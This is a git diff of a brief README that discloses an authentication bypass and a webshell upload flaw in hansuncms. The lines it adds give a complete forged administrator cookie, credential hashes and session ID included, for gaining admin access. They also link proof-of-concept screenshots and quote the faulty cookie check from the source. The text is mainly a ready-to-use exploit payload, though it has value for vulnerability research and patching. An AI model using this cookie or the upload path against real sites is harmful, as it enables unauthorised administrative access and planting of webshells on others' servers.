@@ -3,8 +3,10 @@
 hansuncms  Authentication Bypass and File Upload
 
 hansuncms [](https://www.68team.com/)
-more like  CNVD-2017-20077  
-hansuncms have net 1.4.3 ueditor and Authentication Bypass
+<br>Authentication Bypass cookies add AdminUser=AdminId=3B17A20D0B04694C&AdminUser=A5D8190690DE7EC5&AdminPwd=28AF506D68AA3AB1A8F5136675B903480F3C4A24DA67438014A80335E37AD6534880AD891A5A15A1&AdminName=A5D8190690DE7EC5&Language=30;ASP.NET_SessionId=hlz4zjbvx0dze5haljxdxuuk<br>
+<br>![poc](https://github.com/MorStardust/hansuncmswebshell/blob/main/bypass.png)<br>
+<br>webshell upload more like  CNVD-2017-20077  <br>
+<br>hansuncms have net 1.4.3 ueditor and Authentication Bypass<br>
 <br>some code<br>
 ![code](https://github.com/MorStardust/hansuncmswebshell/blob/main/code.png)
  <br>if (context.Request.Cookies["AdminUser"] != null || context.Request.Cookies["AdminUser"]["SysUser"] != "")<br>
